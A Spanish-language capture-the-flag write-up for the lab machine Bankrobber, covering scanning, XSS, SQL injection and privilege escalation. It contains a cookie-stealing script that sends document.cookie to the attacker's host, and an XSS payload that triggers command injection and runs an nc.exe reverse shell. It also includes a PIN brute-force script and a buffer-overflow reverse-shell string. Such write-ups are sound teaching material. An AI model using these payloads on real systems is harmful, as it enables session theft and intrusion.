

![1](</Writeups/Maquinas/Bankrobber/img/logo.png>)
By Rug4lo

## Reconocimiento 

Primero que todo vamos a hacer un escanedo de puertos con `Nmap`
```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.154
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 13:04 CET
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.10.154 [65535 ports]
Discovered open port 3306/tcp on 10.10.10.154
Discovered open port 80/tcp on 10.10.10.154
Discovered open port 445/tcp on 10.10.10.154
Discovered open port 443/tcp on 10.10.10.154
Completed SYN Stealth Scan at 13:04, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.154
Host is up, received user-set (0.039s latency).
Scanned at 2023-11-08 13:04:01 CET for 26s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
443/tcp  open  https        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
3306/tcp open  mysql        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 24 (1.056KB)
```
Podemos ver que tiene una web en el puerto 80 y otra en el 443 (las cuales son idénticas)

También vemos que el puerto de SMB esta abierto, pero si usamos **smbmap** veremos que no nos deja conectarnos 

Entonces vamos a entrar en la pagina web del puerto 80, en la cual veremos un apartado para registrarnos y otro para crear un usuario

![1](</Writeups/Maquinas/Bankrobber/img/1.png>)

Si creamos un usuario, y nos logeamos, veremos que tenemos un apartado para enviar bitcoins


![1](</Writeups/Maquinas/Bankrobber/img/2.png>)

Si probamos a enviar cualquier cantidad a algún usuario veremos que la peticion de transferencia la tiene que revisar primero un administrador, por lo cual este esta leyendo el mensaje

![1](</Writeups/Maquinas/Bankrobber/img/3.png>)

## XSS Cookie hijacking

Viendo esto y que podemos enviar un mensaje a parte de la cantidad de monedas podemos probar un XSS

Para esto nos ejecutamos un servidor en python y enviamos este texto en el mensaje, para que nos intente cargar un archivo llamado pwned.js (en mi caso abrí el servidor de python por el puerto 8081)
```bash
<script src="http://10.10.14.15:8081/pwned.js"></script>
```
![1](</Writeups/Maquinas/Bankrobber/img/4.png>)

Ahora tenemos que esperar un poco a que el administrador vea nuestra peticion, y comprobar que nos llegue un get a nuestro servidor en python (esta maquina va un poco rara, así que a veces hay que mandar la peticion varias veces)

![1](</Writeups/Maquinas/Bankrobber/img/5.png>)

Perfecto, nos llega la peticion, ahora podemos crearnos un archivo llamado pwned.js el cual tenga un código que le roba la cookie al administrador y nos la envía, el script seria algo como esto
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.15:8081/?cookie=' + document.cookie, true);
request.send();
```
Si todo funciona correctamente deberíamos de recibir el token del administrador

![1](</Writeups/Maquinas/Bankrobber/img/6.png>)

Ahora solo seria sustituirlo por el nuestro

![1](</Writeups/Maquinas/Bankrobber/img/7.png>)

Y refrescar la pagina para entrar al /admin/ directamente

![1](</Writeups/Maquinas/Bankrobber/img/8.png>)

En el /admin podemos ver dos cosas interesantes, un buscador de usuarios y un panel para ejecutar comandos

![1](</Writeups/Maquinas/Bankrobber/img/9.png>)

Podemos probar a ejecutar comandos, pero nos dirá que solo podemos ejecutar el comando dir, desde el localhost

![1](</Writeups/Maquinas/Bankrobber/img/10.png>)

## SQLI Explotation

Por lo que podemos probar con el otro panel, que como busca por id podemos probar a ver si es vulnerable a una SQLI

Para ello vamos a interceptar la peticion con `Burpsuite`

![1](</Writeups/Maquinas/Bankrobber/img/11.png>)

Podemos ver que funciona! (hay muchos usuarios creados por gente, que no son los originales de la maquina, los originales son: admin y gio)

![1](</Writeups/Maquinas/Bankrobber/img/12.png>)

Ahora podemos empezar a listar la información en las bases de datos, para ver si encontramos algo util

Primero descubrimos el numero de columnas que tiene

![1](</Writeups/Maquinas/Bankrobber/img/13.png>)

Ahora podemos usar el union select para listar las bases de datos

![1](</Writeups/Maquinas/Bankrobber/img/14.png>)
![1](</Writeups/Maquinas/Bankrobber/img/15.png>)

Teniendo las bases de datos, podemos las tablas de la base de datos bankrobber 

![1](</Writeups/Maquinas/Bankrobber/img/16.png>)
![1](</Writeups/Maquinas/Bankrobber/img/17.png>)

Listamos la información de la tabla users

![1](</Writeups/Maquinas/Bankrobber/img/18.png>)
![1](</Writeups/Maquinas/Bankrobber/img/19.png>)

Y finalmente listamos la información de los campos username y password

![1](</Writeups/Maquinas/Bankrobber/img/20.png>)
![1](</Writeups/Maquinas/Bankrobber/img/21.png>)

Ahora tenemos la contraseña del usuario admin, y del usuario gio

También podemos listar la información de la base de datos mysql, de la misma manera, en la cual veremos la contraseña del usuario root

![1](</Writeups/Maquinas/Bankrobber/img/22.png>)
![1](</Writeups/Maquinas/Bankrobber/img/23.png>)

Viendo este hash parece un md5sum, asi que vamos a usar una maquina para desencriptarlo

pagina --> https://hashes.com/en/decrypt/hash

![1](</Writeups/Maquinas/Bankrobber/img/24.png>)

Perfecto, ya tenemos 3 contraseñas y 3 usuarios

Ahora que ya hemos terminado con la SQLI por el momento podemos buscar por la pagina, en la que encontraremos algo interesante

![1](</Writeups/Maquinas/Bankrobber/img/25.png>)

Vemos unas notas, las cuales nos dice que hay archivos el la carpeta por defecto de Xampp, si investigamos veremos que esta es la ruta por defecto de Xampp
```bash
C:/xampp/htdocs
```
## SQLI a LFI

Por lo que el /admin estará en el C:/xampp/htdocs/admin/, teniendo eso en cuenta y que tenemos una SQLI activa podemos intentar a listar archivos internos de la maquina

![1](</Writeups/Maquinas/Bankrobber/img/26.png>)
![1](</Writeups/Maquinas/Bankrobber/img/27.png>)

Viendo que podemos listar correctamente archivos de la maquina podemos intentar listar el contenido del php que nos restringía la ejecución de comandos

![1](</Writeups/Maquinas/Bankrobber/img/28.png>)

Vemos que solo verifica que se este usando el dir, así que podríamos concatenar un comando como `dir | powershell -c "\\\\10.10.14.13\\smbFolder\\nc.exe -e cmd 10.10.14.13 4444` pero solo deja ejecutar comandos en el localhost

## XSS para ejecutar comandos

Viendo esto podemos hacer que el administrador ejecute una peticion a este php a través del anterior XSS para que nos ejecute una reverse shell y ganemos acceso a la maquina

Primero vamos a modificar el pwned.js para que se vea así:
```javascript
var request = new XMLHttpRequest();
params = 'cmd=dir|powershell -c "\\\\10.10.14.15\\smbFolder\\nc.exe -e cmd 10.10.14.15 4444"';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
request.send(params);
```
Ahora tenemos que irnos a donde tengamos nuestro nc.exe y abrir un servidor SMB en ese directorio
```bash
python3 smbserver.py smbFolder $(pwd) -smb2support
```
Una vez hecho esto usamos netcat para ponernos en escucha por el puerto 4444 y enviar la XSS

![1](</Writeups/Maquinas/Bankrobber/img/29.png>)

Si todo ha salido correctamente, veremos como ganamos acceso a la maquina

![1](</Writeups/Maquinas/Bankrobber/img/30.png>)

Ahora podemos visualizar la flag del usuario

![1](</Writeups/Maquinas/Bankrobber/img/31.png>)

## Escalada de privilegios

Si nos vamos a la raiz veremos un .exe curioso

![1](</Writeups/Maquinas/Bankrobber/img/32.png>)

Podemos comprobar si hay algún proceso ejecutando este .exe

![1](</Writeups/Maquinas/Bankrobber/img/33.png>)

Vemos que el PID de este proceso es e 1656, por lo que podemos buscar si esta corriendo en algún puerto

![1](</Writeups/Maquinas/Bankrobber/img/34.png>)

Podemos ver que esta corriendo por el puerto 910, viendo esto podemos usar chisel para hacer port forwarding, y trabajar en nuestra maquina de manera mas cómoda

Esto seria en nuestra maquina 

![1](</Writeups/Maquinas/Bankrobber/img/35.png>)

Y esto en el windows

![1](</Writeups/Maquinas/Bankrobber/img/36.png>)

Con esto podemos ver que nos podemos conectar a la utilidad, y que cuando nos conectamos nos pide un pin de 4 dígitos 

![1](</Writeups/Maquinas/Bankrobber/img/37.png>)

Como es muy fácil hacer fuerza bruta a contraseñas tan pequeñas nos hacemos un script en python (primero creamos un archivo llamado pins.txt con todas las combinatorias del 0001 al 9999)
```python
#!/usr/bin/python3

from pwn import *
import time, pdb
	
def tryPin():
    pins = open("pins.txt", "r")
    p1 = log.progress("Fuerza bruta")
    p1.status("Comenzando proceso de fuerza bruta")
    time.sleep(2)
    
    counter = 1
    for pin in pins:
        p1.status("Probando con el PIN %s [%s/10000]" % (pin.strip('\n'), str(counter)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 910))
        data = s.recv(4096)
        s.send(pin.encode())
        data = s.recv(1024)
        
        if b"Access denied" not in data:
            p1.success("El PIN correcto es: %s" % (pin.strip('\n')))
        counter += 1
        
if __name__ == '__main__':
	
    tryPin()
```
Al ejecutar este script veremos que el pin es 0021

![1](</Writeups/Maquinas/Bankrobber/img/38.png>)

Ahora nos podemos identificar y veremos que nos pide una cantidad, para posteriormente ejecutar un comando

![1](</Writeups/Maquinas/Bankrobber/img/39.png>)

Esto da algo de mala espina, por lo que podemos probar un BufferOverflow, veremos que con unos pocos caracteres somos capaces de sobreescribir el comando, ahora solo seria poner el comando que nosotros queramos, en mi caso una reverse shell (nos pasamos el nc.exe a la maquina windows)

![1](</Writeups/Maquinas/Bankrobber/img/40.png>)

Ahora simplemente tendriamos que meter esta cadena, y ponernos en escucha con netcat
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\AppData\Local\Temp\privesc\nc.exe -e cmd 10.10.14.15 4444
```
Con esto tendremos una consola como admin, y podremos visualizar la flag del root
